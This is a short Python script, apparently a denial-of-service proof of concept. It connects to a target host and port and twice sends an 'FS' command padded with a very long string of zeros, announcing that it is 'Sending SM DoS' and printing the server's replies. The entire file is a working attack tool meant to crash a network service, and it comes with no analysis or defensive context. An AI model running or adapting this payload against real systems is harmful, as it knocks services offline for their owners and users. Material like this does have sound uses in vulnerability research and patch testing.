#!/usr/bin/python
# -*- coding: utf-8 -*-

import socket, time
import sys, getopt

def Animation(String):
    animation = "|/-\\"
    for i in range(15):
        time.sleep(0.1)
        sys.stdout.write("\r" + "[" + animation[i % len(animation)] + "]"  + String)
        sys.stdout.flush()
    print('')

def main(argv):
    argc = len(argv)
    if argc <= 1:
            print ("usage: %s <host> <port>" % (argv[0]))
            sys.exit(1)
    sr = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    buffer = "000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
    target = argv[1]
    port = argv[2]

    # Send DoS
    Animation(" Sending SM DoS to " + target + ":" + port + " with length:" +str(len(buffer)))
    sr=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connect=sr.connect((target,int(port)))
    data = sr.recv(1024)

    
    #Printing result

    print ("[*] CONNECTION: " +data)
    sr.send('FS ' + buffer + '\r\n')
    data = sr.recv(1024)
    print ("[+] Received: " +data)
    sr.send('FS ' + buffer + '\r\n')
    data = sr.recv(1024)
    print ("[+] Received: " +data)
    sr.close()

main(sys.argv)
